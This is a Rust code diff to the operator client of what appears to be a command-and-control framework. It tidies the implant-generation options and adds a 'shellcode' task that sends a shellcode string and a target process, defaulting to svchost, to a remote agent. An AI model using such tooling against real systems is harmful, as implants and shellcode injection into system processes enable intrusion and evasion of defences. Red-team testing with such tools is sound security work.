@@ -201,32 +201,32 @@ pub fn set_operations(client: &Client, matches: &ArgMatches) -> (Operation, Opti
                         Some(("gen", subm2)) => {
                             op = Operation::GenerateImplant;
                             let name = match subm2.get_one::<String>("name") {
-                                Some(n) => { n.to_owned() },
+                                Some(n) => { n.to_string() },
                                 None => { random_name("implant".to_owned()) }
                             };
                             let url = match subm2.get_one::<String>("url") {
-                                Some(n) => { n.to_owned() },
+                                Some(n) => { n.to_string() },
                                 None => { "http://localhost:4443/".to_owned() }
                             };
                             let os = match subm2.get_one::<String>("os") {
-                                Some(n) => { n.to_owned() },
-                                None => { "windows".to_owned() }
+                                Some(n) => { n.to_string() },
+                                None => { "windows".to_string() }
                             };
                             let arch = match subm2.get_one::<String>("arch") {
-                                Some(n) => { n.to_owned() },
-                                None => { "amd64".to_owned() }
+                                Some(n) => { n.to_string() },
+                                None => { "amd64".to_string() }
                             };
                             let format = match subm2.get_one::<String>("format") {
-                                Some(n) => { n.to_owned() },
-                                None => { "exe".to_owned() }
+                                Some(n) => { n.to_string() },
+                                None => { "exe".to_string() }
                             };
                             let sleep = match subm2.get_one::<u64>("sleep") {
                                 Some(n) => { *n },
                                 None => { 3 }
                             };
                             let jitter = match subm2.get_one::<u64>("jitter") {
-                                Some(j) => { *j },
-                                None => { 5 }
+                                Some(j) => *j,
+                                None => 5,
                             };
         
                             options.implant_opt = Some(ImplantOption {
@@ -464,6 +464,24 @@ pub fn set_operations(client: &Client, matches: &ArgMatches) -> (Operation, Opti
                         }
                     }
 
+                }
+                Some(("shellcode", subm)) => {
+                    op = Operation::AgentTask("shellcode".to_string());
+
+                    let proc_name = match subm.get_one::<String>("process") {
+                        Some(n) => n.to_string(),
+                        None => "svchost".to_string(),
+                    };
+
+                    let shellcode = match subm.get_one::<String>("shellcode") {
+                        Some(c) => c.to_string(),
+                        None => "none".to_string(),
+                    };
+
+                    options.task_opt = Some(TaskOption {
+                        agent_name: Some(agent_name.to_owned()),
+                        args: Some(proc_name + " " + shellcode.as_str()),
+                    });
                 }
                 Some(("sleep", subm)) => {
                     op = Operation::AgentTask("sleep".to_string());
